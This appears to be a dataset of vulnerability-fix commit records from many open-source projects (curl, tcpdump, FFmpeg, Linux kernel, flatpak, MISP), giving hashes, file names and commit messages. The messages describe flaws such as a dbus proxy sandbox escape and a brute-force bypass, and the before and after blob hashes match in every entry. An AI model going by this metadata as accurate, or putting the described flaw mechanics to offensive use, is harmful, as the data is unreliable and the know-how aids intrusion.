    2ee7663d07bd2accfea2b0e3733a5dcfd502f38c
Projects:
    AlanSchwartz_resiprocate
Commit Message for 2cb291191c93c7c4e371e22cb89805a5b31d6608:
-fixed an issue where the stack could crash if a TCP based sender sends a Content-Length that is less that the actual SIP body transmitted  in order to trigger this condition the SIP message body must arrive in a separate read request, either from the start or part way through the body  and there must be data following the body in the same read.

======================================================================
Commit With Fix: 
    bfdcdec64865238163282c5940a6c7896c0977bf
File(s) In Commit: 
    templates/frontend/pages/searchResults.tpl
Blob(s) In Commit: 
    036d6d6527dcb35dd986a3decd38d9200429f3d4
Blob(s) Before Fix: 
    036d6d6527dcb35dd986a3decd38d9200429f3d4
Projects:
    EKT_omp
Commit Message for bfdcdec64865238163282c5940a6c7896c0977bf:
pkp/pkp-lib#3805 Add missing escaping to catalog.noTitlesSearch

======================================================================
Commit With Fix: 
    6ffacc1e239930e0e8464d0ca16e432e26cf36a9
File(s) In Commit: 
    app/Controller/UsersController.php
Blob(s) In Commit: 
    a272436ba56c05fa6a84557bc1d62ea14d65c8da
Blob(s) Before Fix: 
    a272436ba56c05fa6a84557bc1d62ea14d65c8da
Projects:
    0-vortex_MISP
Commit Message for 6ffacc1e239930e0e8464d0ca16e432e26cf36a9:
fix: [security] Brute force protection can be bypased with a PUT request\n\n- fixes an issue where brute forcing the login would work by using PUT requests - as reported by Silver Saks from CCDCOE

======================================================================
Commit With Fix: 
    4be817e8b03e7e92517e91f2dfcc50865e91c6ea
File(s) In Commit: 
    src/zmq_van.h
Blob(s) In Commit: 
    f6a14cc4e54c6c85eeda32b55fbe2ce4e0f749ac
Blob(s) Before Fix: 
    f6a14cc4e54c6c85eeda32b55fbe2ce4e0f749ac
Projects:
    131250105_ps-lite
Commit Message for 4be817e8b03e7e92517e91f2dfcc50865e91c6ea:
Avoid listening on all interfaces by default

======================================================================
Commit With Fix: 
    c3812075e30c76a800a961e7291087d357403f6b
File(s) In Commit: 
    rbd-target-api.py
Blob(s) In Commit: 
    394c7e075b62022f5595e1ae9da36786b8e54349
Blob(s) Before Fix: 
    394c7e075b62022f5595e1ae9da36786b8e54349
Projects:
    SUSE_ceph-iscsi
Commit Message for c3812075e30c76a800a961e7291087d357403f6b:
rbd-target-api: disable the built-in werkzeug debugger\n\nSigned-off-by: Jason Dillaman <dillaman@redhat.com>

======================================================================
Commit With Fix: 
    72058f9253e7ed8c7243e2ff76a16d97b03d65ed
File(s) In Commit: 
    soscollector/sos_collector.py
Blob(s) In Commit: 
    f1d4716427003a981aaaa7a5e4a7fbbb63042c6a
Blob(s) Before Fix: 
    f1d4716427003a981aaaa7a5e4a7fbbb63042c6a
Projects:
    sosreport_sos-collector
Commit Message for 72058f9253e7ed8c7243e2ff76a16d97b03d65ed:
[sos_collector] Set umask for all files created\n\nSets a umask of 0077 for all files created by sos-collector. This ensures collected sosrpeorts are not world readable and maintains the original permissions of the sos archives.\n\nSigned-off-by: Jake Hunsaker <jhunsake@redhat.com>

======================================================================
Commit With Fix: 
    f18e5adf123221a1015be63e1ca2491ca45b8d10
File(s) In Commit: 
    lib/Server.js
Blob(s) In Commit: 
    c56fe79c33689aad46584caf2f502ca7f6243f41
Blob(s) Before Fix: 
    c56fe79c33689aad46584caf2f502ca7f6243f41
Projects:
    0xCMP_webpack-dev-server
Commit Message for f18e5adf123221a1015be63e1ca2491ca45b8d10:
check origin header for websocket connection

======================================================================
Commit With Fix: 
    9ba91381954ad325ea4fd26b9c65a8bd9a2a85b6
File(s) In Commit: 
    tcpdump.c
Blob(s) In Commit: 
    043bda1d7aca523ac17d555e5bcd1e09a676adfe
Blob(s) Before Fix: 
    043bda1d7aca523ac17d555e5bcd1e09a676adfe
Projects:
    0xmitsurugi_tcpdump
Commit Message for 9ba91381954ad325ea4fd26b9c65a8bd9a2a85b6:
(for 4.9.3) CVE-2018-14879/fix -V to fail invalid input safely\n\nget_next_file() did not check the return value of strlen() and underflowed an array index if the line read by fgets() from the file started with \0. This caused an out-of-bounds read and could cause a write. Add the missing check.\n\nThis vulnerability was discovered by Brian Carpenter & Geeknik Labs.

======================================================================
Commit With Fix: 
    71aaeaf020340412b8d012fe23a556c0420eda5f
File(s) In Commit: 
    pango/pango-emoji.c
Blob(s) In Commit: 
    29472452dd3855faeb22c900dbe4c41226f7f90c
Blob(s) Before Fix: 
    29472452dd3855faeb22c900dbe4c41226f7f90c
Projects:
    GNOME_pango
Commit Message for 71aaeaf020340412b8d012fe23a556c0420eda5f:
Prevent an assertion with invalid Unicode sequences\n\nInvalid Unicode sequences, such as 0x2665 0xfe0e 0xfe0f, can trick the Emoji iter code into returning an empty segment, which then triggers an assertion in the itemizer.\n\nPrevent this by ensuring that we make progress.\n\nThis issue was reported by Jeffrey M.

======================================================================
Commit With Fix: 
    ef111822562d0b9365bd3e671a75b65bd0613353
File(s) In Commit: 
    javamelody-core/src/main/java/net/bull/javamelody/PayloadNameRequestWrapper.java
Blob(s) In Commit: 
    f03c1419f1eb8c6efe68758b182c227f03ff150e
Blob(s) Before Fix: 
    f03c1419f1eb8c6efe68758b182c227f03ff150e
Projects:
    06094051_javamelody
Commit Message for ef111822562d0b9365bd3e671a75b65bd0613353:
fix for security

======================================================================
Commit With Fix: 
    af2cf04a9394c1a56227c2289ae8da262828294a
File(s) In Commit: 
    print-bgp.c
Blob(s) In Commit: 
    7db3c6bb0f93931a2cdddae9ff55cdf544dac2f5
Blob(s) Before Fix: 
    7db3c6bb0f93931a2cdddae9ff55cdf544dac2f5
Projects:
    0xmitsurugi_tcpdump
Commit Message for af2cf04a9394c1a56227c2289ae8da262828294a:
(for 4.9.3) CVE-2018-16300/BGP: prevent stack exhaustion\n\nEnforce a limit on how many times bgp_attr_print() can recurse.\n\nThis fixes a stack exhaustion discovered by Include Security working under the Mozilla SOS program in 2018 by means of code audit.

======================================================================
Commit With Fix: 
    e5bb5297f68e56537c004cdbb48a30892e9f6f4c
File(s) In Commit: 
    e107_web/js/plupload/upload.php
Blob(s) In Commit: 
    12c33646a5ba1162a662b587f31efd2996a32095
Blob(s) Before Fix: 
    12c33646a5ba1162a662b587f31efd2996a32095
Projects:
    Alex-e107nl_e107
Commit Message for e5bb5297f68e56537c004cdbb48a30892e9f6f4c:
plupload fix.

======================================================================
Commit With Fix: 
    ec483e9379aa622bfcc1b853b189c74288771f27
File(s) In Commit: 
    e107_admin/banlist.php
Blob(s) In Commit: 
    591de39c046e760e1ce144a7f07f7d550c6cd658
Blob(s) Before Fix: 
    591de39c046e760e1ce144a7f07f7d550c6cd658
Projects:
    Alex-e107nl_e107
Commit Message for ec483e9379aa622bfcc1b853b189c74288771f27:
Code cleanup

======================================================================
Commit With Fix: 
    96480ab95308cd9234b4f09b175ebf60e17792c6
File(s) In Commit: 
    print-smb.c
Blob(s) In Commit: 
    944b8d28abfc0c4dc723f477c9e794fcb9f79ac0
Blob(s) Before Fix: 
    944b8d28abfc0c4dc723f477c9e794fcb9f79ac0
Projects:
    0xmitsurugi_tcpdump
Commit Message for 96480ab95308cd9234b4f09b175ebf60e17792c6:
(for 4.9.3) SMB: Add two missing bounds checks

======================================================================
Commit With Fix: 
    24182d959f661327525a20d9a94c98a8ec016778
File(s) In Commit: 
    smbutil.c
Blob(s) In Commit: 
    7b01f487dbc2de43cb1cdb19c5a017866d27d80d
Blob(s) Before Fix: 
    7b01f487dbc2de43cb1cdb19c5a017866d27d80d
Projects:
    0xmitsurugi_tcpdump
Commit Message for 24182d959f661327525a20d9a94c98a8ec016778:
(for 4.9.3) CVE-2018-16452/SMB: prevent stack exhaustion\n\nEnforce a limit on how many times smb_fdata() can recurse.\n\nThis fixes a stack exhaustion discovered by Include Security working under the Mozilla SOS program in 2018 by means of code audit.

======================================================================
Commit With Fix: 
    f3a24d7916b9173c69a3e0ee790102993833d6c5
File(s) In Commit: 
    lib/vauth/cleartext.c
Blob(s) In Commit: 
    be6d6111e22e20f0eed3c67e4e1e865654186459
Blob(s) Before Fix: 
    be6d6111e22e20f0eed3c67e4e1e865654186459
Projects:
    0ca_curl
Commit Message for f3a24d7916b9173c69a3e0ee790102993833d6c5:
Curl_auth_create_plain_message: fix too-large-input-check\n\nCVE-2018-16839 Reported-by: Harry Sintonen Bug: https://curl.haxx.se/docs/CVE-2018-16839.html

======================================================================
Commit With Fix: 
    81d135d67155c5295b1033679c606165d4e28f3f
File(s) In Commit: 
    lib/url.c
Blob(s) In Commit: 
    0d5a13f99639b2444a8a1b1eeadf9be2fe036fd0
Blob(s) Before Fix: 
    0d5a13f99639b2444a8a1b1eeadf9be2fe036fd0
Projects:
    0ca_curl
Commit Message for 81d135d67155c5295b1033679c606165d4e28f3f:
Curl_close: clear data->multi_easy on free to avoid use-after-free\n\nRegression from b46cfbc068 (7.59.0) CVE-2018-16840 Reported-by: Brian Carpenter (Geeknik Labs)\n\nBug: https://curl.haxx.se/docs/CVE-2018-16840.html

======================================================================
Commit With Fix: 
    d530e92f59ae9bb2d47066c3c460b25d2ffeb211
File(s) In Commit: 
    src/tool_msgs.c
Blob(s) In Commit: 
    f5e1df25fb42703531d17f0dee3e2da6b40c8bae
Blob(s) Before Fix: 
    f5e1df25fb42703531d17f0dee3e2da6b40c8bae
Projects:
    0ca_curl
Commit Message for d530e92f59ae9bb2d47066c3c460b25d2ffeb211:
voutf: fix bad arethmetic when outputting warnings to stderr\n\nCVE-2018-16842 Reported-by: Brian Carpenter Bug: https://curl.haxx.se/docs/CVE-2018-16842.html

======================================================================
Commit With Fix: 
    ffd668a3aa7d2f540dbcdf5751f207302519df72
File(s) In Commit: 
    core/admin/ajax/file-browser/upload.php
Blob(s) In Commit: 
    5453dec7fe5786da7de8468ba5bc7508d061197d
Blob(s) Before Fix: 
    5453dec7fe5786da7de8468ba5bc7508d061197d
Projects:
    4v4t4r_BigTree-CMS
Commit Message for ffd668a3aa7d2f540dbcdf5751f207302519df72:
Fixing XSS on file names that fail to upload

======================================================================
Commit With Fix: 
    34716e2a6ee2af96078d62b065b7785c001194be
File(s) In Commit: 
    util.c
Blob(s) In Commit: 
    c5c7becc0f1280bfdaba04d09ed95213ad6fdd08
Blob(s) Before Fix: 
    c5c7becc0f1280bfdaba04d09ed95213ad6fdd08
Projects:
    1nickt_perl5
Commit Message for 34716e2a6ee2af96078d62b065b7785c001194be:
Perl_my_setenv()  handle integer wrap\n\nRT #133204\n\nWean this function off int/I32 and onto UV/Size_t. Also, replace all malloc-ish calls with a wrapper that does overflow checks,\n\nIn particular, it was doing (nlen + vlen + 2) which could wrap when the combined length of the environment variable name and value exceeded around 0x7fffffff.\n\nThe wrapper check function is probably overkill, but belt and braces...\n\nNB this function has several variant parts, #ifdef'ed by platform type  I have blindly changed the parts that aren't compiled under linux.

======================================================================
Commit With Fix: 
    43b2f4ef399e2fd7240b4eeb0658686ad95f8e62
File(s) In Commit: 
    regcomp.c
Blob(s) In Commit: 
    9aec81ddfa3e134637bd33ee08ba162445b5f0bd
Blob(s) Before Fix: 
    9aec81ddfa3e134637bd33ee08ba162445b5f0bd
Projects:
    1nickt_perl5
Commit Message for 43b2f4ef399e2fd7240b4eeb0658686ad95f8e62:
regcomp.c: Convert some strchr to memchr\n\nThis allows things to work properly in the face of embedded NULs. See the branch merge message for more information.

======================================================================
Commit With Fix: 
    c69402c4764ed9a76301c57277aefe70141b6418
File(s) In Commit: 
    core/inc/bigtree/admin.php
Blob(s) In Commit: 
    d91d4665131d6c8e71c761c73cd597b2bd332905
Blob(s) Before Fix: 
    d91d4665131d6c8e71c761c73cd597b2bd332905
Projects:
    4v4t4r_BigTree-CMS
Commit Message for c69402c4764ed9a76301c57277aefe70141b6418:
Regenerating session IDs on login state change. Thanks to Juttikhun Khamchaiyaphum for the suggestion.

======================================================================
Commit With Fix: 
    cced03dd667a5df6df8fd40d8de0bff477ee02e8
File(s) In Commit: 
    libavformat/mms.c
Blob(s) In Commit: 
    768fda652543b482eb6a702fa9b39f0032858122
Blob(s) Before Fix: 
    768fda652543b482eb6a702fa9b39f0032858122
Projects:
    00ERNEST00_FFmpeg
Commit Message for cced03dd667a5df6df8fd40d8de0bff477ee02e8:
avformat/mms: Add missing chunksize check\n\nFixes: out of array read Fixes: mms-crash-01b6c5d85f9d9f40f4e879896103e9f5b222816a\n\nFound-by: Paul Ch <paulcher@icloud.com> 1st hunk by Paul Ch <paulcher@icloud.com> Tested-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    2b46ebdbff1d8dec7a3d8ea280a612b91a582869
File(s) In Commit: 
    libavformat/asfdec_o.c
Blob(s) In Commit: 
    b4b2698368fc66cc13d7f6d41f3b21312bcd5de0
Blob(s) Before Fix: 
    b4b2698368fc66cc13d7f6d41f3b21312bcd5de0
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2b46ebdbff1d8dec7a3d8ea280a612b91a582869:
avformat/asfdec_o: Check size_bmp more fully\n\nFixes: integer overflow and out of array access Fixes: asfo-crash-46080c4341572a7137a162331af77f6ded45cbd7\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    9807d3976be0e92e4ece3b4b1701be894cd7c2e1
File(s) In Commit: 
    libavformat/pva.c
Blob(s) In Commit: 
    04ae8e2800cce1cd203d712929bb96c4b1f50ea6
Blob(s) Before Fix: 
    04ae8e2800cce1cd203d712929bb96c4b1f50ea6
Projects:
    00ERNEST00_FFmpeg
Commit Message for 9807d3976be0e92e4ece3b4b1701be894cd7c2e1:
avformat/pva: Check for EOF before retrying in read_part_of_packet()\n\nFixes: Infinite loop Fixes: pva-4b1835dbc2027bf3c567005dcc78e85199240d06\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    a7e032a277452366771951e29fd0bf2bd5c029f0
File(s) In Commit: 
    libavformat/rmdec.c
Blob(s) In Commit: 
    0216003e88e46a52c254cb1a6fa4f7099f3a3414
Blob(s) Before Fix: 
    0216003e88e46a52c254cb1a6fa4f7099f3a3414
Projects:
    00ERNEST00_FFmpeg
Commit Message for a7e032a277452366771951e29fd0bf2bd5c029f0:
avformat/rmdec: Do not pass mime type in rm_read_multi() to ff_rm_read_mdpr_codecdata()\n\nFixes: use after free() Fixes: rmdec-crash-ffe85b4cab1597d1cfea6955705e53f1f5c8a362\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75
File(s) In Commit: 
    libavformat/mxfdec.c
Blob(s) In Commit: 
    3a8e76e51ce2d5dd1682ec87b88dce70f20db721
Blob(s) Before Fix: 
    3a8e76e51ce2d5dd1682ec87b88dce70f20db721
Projects:
    00ERNEST00_FFmpeg
Commit Message for bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75:
avformat/mxfdec: Fix av_log context\n\nFixes: out of array access Fixes: mxf-crash-1c2e59bf07a34675bfb3ada5e1ec22fa9f38f923\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    5aba5b89d0b1d73164d3b81764828bb8b20ff32a
File(s) In Commit: 
    libavcodec/mpeg4videodec.c
Blob(s) In Commit: 
    24c280df4658df04ebdfaea6c37b993533e4cbf0
Blob(s) Before Fix: 
    24c280df4658df04ebdfaea6c37b993533e4cbf0
Projects:
    00ERNEST00_FFmpeg
Commit Message for 5aba5b89d0b1d73164d3b81764828bb8b20ff32a:
avcodec/mpeg4videodec: Check for bitstream end in read_quant_matrix_ext()\n\nFixes: out of array read Fixes: asff-crash-0e53d0dc491dfdd507530b66562812fbd4c36678\n\nFound-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    1aaf2182a6b722ad539e2717bc11967d1bde723a
File(s) In Commit: 
    app/org/thp/cortex/controllers/UserCtrl.scala
Blob(s) In Commit: 
    3e2124bfb6d1cc2a6c9f85c15f73f73978017074
Blob(s) Before Fix: 
    3e2124bfb6d1cc2a6c9f85c15f73f73978017074
Projects:
    3c7_Cortex
Commit Message for 1aaf2182a6b722ad539e2717bc11967d1bde723a:
#158 Fix checks in user creation

======================================================================
Commit With Fix: 
    6d60bc8ed010c4eda05d6645c64849f415f68d65
File(s) In Commit: 
    app/helpers/tags_helper.rb
Blob(s) In Commit: 
    397977682fc6b91f72d926a9d068f805a061fc3d
Blob(s) Before Fix: 
    397977682fc6b91f72d926a9d068f805a061fc3d
Projects:
    0bserver07_fat_free_crm
Commit Message for 6d60bc8ed010c4eda05d6645c64849f415f68d65:
Context-sensitive XSS bugfix.

======================================================================
Commit With Fix: 
    c095508770aebf1b9218e77026e48345d719b17c
File(s) In Commit: 
    net/rds/rdma.c
Blob(s) In Commit: 
    94729d9da43721b49e01b8d85a30e12bad5294cb
Blob(s) Before Fix: 
    94729d9da43721b49e01b8d85a30e12bad5294cb
Projects:
    0-T-0_ps4-linux
Commit Message for c095508770aebf1b9218e77026e48345d719b17c:
RDS: Heap OOB write in rds_message_alloc_sgs()\n\nWhen args->nr_local is 0, nr_pages gets also 0 due some size calculation via rds_rm_size(), which is later used to allocate pages for DMA, this bug produces a heap Out-Of-Bound write access to a specific memory region.\n\nSigned-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7d11f77f84b27cef452cee332f4e469503084737
File(s) In Commit: 
    net/rds/rdma.c
Blob(s) In Commit: 
    634cfcb7bba6833bde376706947c99f1cb103199
Blob(s) Before Fix: 
    634cfcb7bba6833bde376706947c99f1cb103199
Projects:
    0-T-0_ps4-linux
Commit Message for 7d11f77f84b27cef452cee332f4e469503084737:
RDS: null pointer dereference in rds_atomic_free_op\n\nset rm->atomic.op_active to 0 when rds_pin_pages() fails or the user supplied address is invalid, this prevents a NULL pointer usage in rds_atomic_free_op()\n\nSigned-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c0f326d05231072e33679b84835c03d5043255cb
File(s) In Commit: 
    setup/classes/class.ilSetupGUI.php
Blob(s) In Commit: 
    36682dbfc9afa41d4b581ad18f6291506c3b8ed6
Blob(s) Before Fix: 
    36682dbfc9afa41d4b581ad18f6291506c3b8ed6
Projects:
    09132100935_ILIAS
Commit Message for c0f326d05231072e33679b84835c03d5043255cb:
Fixed output of "cmd" parameter\n\n(cherry picked from commit 2106df4)

======================================================================
Commit With Fix: 
    073c516ff73557a8f7315066856c04b50383ac34
File(s) In Commit: 
    fs/nsfs.c
Blob(s) In Commit: 
    323f492e0822dd3286365d5cdbe56c59ec2d5463
Blob(s) Before Fix: 
    323f492e0822dd3286365d5cdbe56c59ec2d5463
Projects:
    0-T-0_ps4-linux
Commit Message for 073c516ff73557a8f7315066856c04b50383ac34:
nsfs: mark dentry with DCACHE_RCUACCESS\n\nAndrey reported a use-after-free in __ns_get_path():\n\n  spin_lock include/linux/spinlock.h:299 [inline]   lockref_get_not_dead+0x19/0x80 lib/lockref.c:179   __ns_get_path+0x197/0x860 fs/nsfs.c:66   open_related_ns+0xda/0x200 fs/nsfs.c:143   sock_ioctl+0x39d/0x440 net/socket.c:1001   vfs_ioctl fs/ioctl.c:45 [inline]   do_vfs_ioctl+0x1bf/0x1780 fs/ioctl.c:685   SYSC_ioctl fs/ioctl.c:700 [inline]   SyS_ioctl+0x8f/0xc0 fs/ioctl.c:691\n\nWe are under rcu read lock protection at that point:\n\n        rcu_read_lock()          d = atomic_long_read(&ns->stashed)          if (!d)                 goto slow          dentry = (struct dentry *)d          if (!lockref_get_not_dead(&dentry->d_lockref))                 goto slow          rcu_read_unlock() \n\nbut don't use a proper RCU API on the free path, therefore a parallel __d_free() could free it at the same time.  We need to mark the stashed dentry with DCACHE_RCUACCESS so that __d_free() will be called after all readers leave RCU.\n\nFixes: e149ed2b805f ("take the targets of /proc/*/ns/* symlinks to separate fs") Cc: Alexander Viro <viro@zeniv.linux.org.uk> Cc: Andrew Morton <akpm@linux-foundation.org> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    8354763b90490d4105695df52674d0fcef823e92
File(s) In Commit: 
    table.c
Blob(s) In Commit: 
    4f193e155b1772e0f0d03b7c2366bab7e2e310be
Blob(s) Before Fix: 
    4f193e155b1772e0f0d03b7c2366bab7e2e310be
Projects:
    ii0_w3m
Commit Message for 8354763b90490d4105695df52674d0fcef823e92:
Prevent negative indent value in feed_table_block_tag()\n\nBug-Debian: https://github.com/tats/w3m/issues/88

======================================================================
Commit With Fix: 
    7fdc83b0364005a0b5ed869230dd81752ba022e8
File(s) In Commit: 
    form.c
Blob(s) In Commit: 
    bc14d39fed0625e0d083454a47a59cc3c30e8921
Blob(s) Before Fix: 
    bc14d39fed0625e0d083454a47a59cc3c30e8921
Projects:
    ii0_w3m
Commit Message for 7fdc83b0364005a0b5ed869230dd81752ba022e8:
Prevent invalid columnPos() call in formUpdateBuffer()\n\nBug-Debian: https://github.com/tats/w3m/issues/89

======================================================================
Commit With Fix: 
    250c6c49e3b68756b14983c076183568636e2bde
File(s) In Commit: 
    drivers/video/fbdev/sbuslib.c
Blob(s) In Commit: 
    a436d44f1b7fbf4e2fe2447de21a6aa5a4903cde
Blob(s) Before Fix: 
    a436d44f1b7fbf4e2fe2447de21a6aa5a4903cde
Projects:
    0-T-0_ps4-linux
Commit Message for 250c6c49e3b68756b14983c076183568636e2bde:
fbdev: Fixing arbitrary kernel leak in case FBIOGETCMAP_SPARC in sbusfb_ioctl_helper().\n\nFixing arbitrary kernel leak in case FBIOGETCMAP_SPARC in sbusfb_ioctl_helper().\n\n'index' is defined as an int in sbusfb_ioctl_helper(). We retrieve this from the user: if (get_user(index, &c->index) ||     __get_user(count, &c->count) ||     __get_user(ured, &c->red) ||     __get_user(ugreen, &c->green) ||     __get_user(ublue, &c->blue))        return -EFAULT \n\nand then we use 'index' in the following way: red = cmap->red[index + i] >> 8  green = cmap->green[index + i] >> 8  blue = cmap->blue[index + i] >> 8 \n\nThis is a classic information leak vulnerability. 'index' should be an unsigned int, given its usage above.\n\nThis patch is straight-forward  it changes 'index' to unsigned int in two switch-cases: FBIOGETCMAP_SPARC && FBIOPUTCMAP_SPARC.\n\nThis patch fixes CVE-2018-6412.\n\nSigned-off-by: Peter Malone <peter.malone@gmail.com> Acked-by: Mathieu Malaterre <malat@debian.org> Signed-off-by: Bartlomiej Zolnierkiewicz <b.zolnierkie@samsung.com>

======================================================================
Commit With Fix: 
    de686a9e6d8c909485b87ca09c8f912bf83082f2
File(s) In Commit: 
    core/current_user_api.php
Blob(s) In Commit: 
    e60e00504de5f12788447db1130bfc7d03f151e7
Blob(s) Before Fix: 
    e60e00504de5f12788447db1130bfc7d03f151e7
Projects:
    01-Scripts_mantisbt
Commit Message for de686a9e6d8c909485b87ca09c8f912bf83082f2:
Fix PHP error - wrong argument type\n\nInitialize $t_filter variable as array() instead of '' in current_user_get_bug_filter(), to ensure its type is correct when calling filter_ensure_valid_filter().\n\nFixes #23921

======================================================================
Commit With Fix: 
    52346bf187b5a7f1c0fe9075b328b7ad6abe78f6
File(s) In Commit: 
    dbus-proxy/flatpak-proxy.c
Blob(s) In Commit: 
    ff5fe455d19602ec34fb4d7efa69cf44280cccb3
Blob(s) Before Fix: 
    ff5fe455d19602ec34fb4d7efa69cf44280cccb3
Projects:
    Acidburn0zzz_flatpak
Commit Message for 52346bf187b5a7f1c0fe9075b328b7ad6abe78f6:
Fix vulnerability in dbus proxy\n\nDuring the authentication all client data is directly forwarded to the dbus daemon as is, until we detect the BEGIN command after which we start filtering the binary dbus protocol.\n\nUnfortunately the detection of the BEGIN command in the proxy did not exactly match the detection in the dbus daemon. A BEGIN followed by a space or tab was considered ok in the daemon but not by the proxy. This could be exploited to send arbitrary dbus messages to the host, which can be used to break out of the sandbox.\n\nThis was noticed by Gabriel Campana of The Google Security Team.\n\nThis fix makes the detection of the authentication phase end match the dbus code. In addition we duplicate the authentication line validation from dbus, which includes ensuring all data is ASCII, and limiting the size of a line to 16k. In fact, we add some extra stringent checks, disallowing ASCII control chars and requiring that auth lines start with a capital letter.

======================================================================
Commit With Fix: 
    b60b322cf9f0ffa624018f1bb9783edf0dc908c3
File(s) In Commit: 
    soundlib/Load_stp.cpp
Blob(s) In Commit: 
    4389a4f357c493f8c64fc488db3589b0b5cef3ca
Blob(s) Before Fix: 
    4389a4f357c493f8c64fc488db3589b0b5cef3ca
Projects:
    DW01_openmpt
Commit Message for b60b322cf9f0ffa624018f1bb9783edf0dc908c3:
[Sec] STP: Possible out-of-bounds memory read with malformed STP files (caught with afl-fuzz). Patch-by: sagamusix (originally committed as part of r9568)\n\n git-svn-id: https://source.openmpt.org/svn/openmpt/branches/OpenMPT-1.27@9576 56274372-70c3-4bfc-bfc3-4c3a0b034d27

======================================================================
Commit With Fix: 
    448cd13e7b18c83855d706c564341ddd1e38e769
File(s) In Commit: 
    src/uncurl.c
Blob(s) In Commit: 
    9ea8642b597f3d58f3c4a53dc4ca42f050a5a5a2
Blob(s) Before Fix: 
    9ea8642b597f3d58f3c4a53dc4ca42f050a5a5a2
Projects:
    cmuir_uncurl
Commit Message for 448cd13e7b18c83855d706c564341ddd1e38e769:
origin matching must come at str end

======================================================================
Commit With Fix: 
    d5bf76b5a88d044a1be1d5656698e3ba737167e5
File(s) In Commit: 
    cli/riff.c
Blob(s) In Commit: 
    de98c1e39fa44ad3338338a3df7d783f7adb8840
Blob(s) Before Fix: 
    de98c1e39fa44ad3338338a3df7d783f7adb8840
Projects:
    EQ4_WavPack
Commit Message for d5bf76b5a88d044a1be1d5656698e3ba737167e5:
issue #27, do not overwrite stack on corrupt RF64 file

======================================================================
Commit With Fix: 
    a03422b09468cdd5f192b05643311c705447588b
File(s) In Commit: 
    src/static/js/pad_utils.js
Blob(s) In Commit: 
    9c1277a00ce449c64a0af431025cdbe1b9096215
Blob(s) Before Fix: 
    9c1277a00ce449c64a0af431025cdbe1b9096215
Projects:
    00SteinsGate00_etherpad-lite
Commit Message for a03422b09468cdd5f192b05643311c705447588b:
Merge pull request #3313 from rhelmer/sanitize-window-location\n\nbetter sanitize window location in error messages

======================================================================
Commit With Fix: 
    64efdc4fd974c83cedd221b46e7c3854a81650ec
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    022c9885ea454ba3afd913e10ef0fd0240a67a20
Blob(s) Before Fix: 
    022c9885ea454ba3afd913e10ef0fd0240a67a20
Projects:
    xss_wondercms
Commit Message for 64efdc4fd974c83cedd221b46e7c3854a81650ec:
Update index.php\n\n- Fixed vulnerability - logged in admin could delete files from any directory (added realpath).  - Added SRI hashes to external JavaScript and CSS files: jquery.min.js, bootstrap.min.js, autosize.min.js, taboverride.min.js, jquery.taboverride.min.js, bootstrap.min.css).  - Removed uneccessarry session unset.  - Minor text changes.

======================================================================
Commit With Fix: 
    1845c0e4b1bff3462c91c3108c85205acd3c75a2
File(s) In Commit: 
    oauthenticator/gitlab.py
Blob(s) In Commit: 
    e6669c2ac423c04573f2e6c7e9b4edc8673025d4
Blob(s) Before Fix: 
    e6669c2ac423c04573f2e6c7e9b4edc8673025d4
Projects:
    42n4_jupyter-dockers
Commit Message for 1845c0e4b1bff3462c91c3108c85205acd3c75a2:
Security fix: fix gitlab group whitelist check\n\ncheck group membership of users\n\npreviously, group_whitelist allowed any user who could access the groups in the whitelist, rather than checking their membership of the groups.\n\nAdmin users received the correct behavior already

======================================================================
Commit With Fix: 
    568e8db44930fda4563c1e708a2440909fd8e5fe
File(s) In Commit: 
    lib/Zonemaster/GUI/Dancer/Export.pm
Blob(s) In Commit: 
    a26278add4f172c6454c55f5339070932e9eef97
Blob(s) Before Fix: 
    a26278add4f172c6454c55f5339070932e9eef97
Projects:
    dne_zonemaster-gui
Commit Message for 568e8db44930fda4563c1e708a2440909fd8e5fe:
Escape HTML

======================================================================
Commit With Fix: 
    4f6af7f69f29df8555a18b9bb7b646906b45924d
File(s) In Commit: 
    src/SAML2/HTTPRedirect.php
Blob(s) In Commit: 
    ec40a15a96d1eff967fbb13923927786fb7dca22
Blob(s) Before Fix: 
    ec40a15a96d1eff967fbb13923927786fb7dca22
Projects:
    01000101_saml2
Commit Message for 4f6af7f69f29df8555a18b9bb7b646906b45924d:
Be strict when checking return values.

======================================================================
Commit With Fix: 
    58a6fe94cb851f71214dbefac3f9bffee437d6fe
File(s) In Commit: 
    src/index.c
Blob(s) In Commit: 
    3ef892b7f170b1fdad356de32061652d7f97c48a
Blob(s) Before Fix: 
    3ef892b7f170b1fdad356de32061652d7f97c48a
Projects:
    0x41111111_libgit2
Commit Message for 58a6fe94cb851f71214dbefac3f9bffee437d6fe:
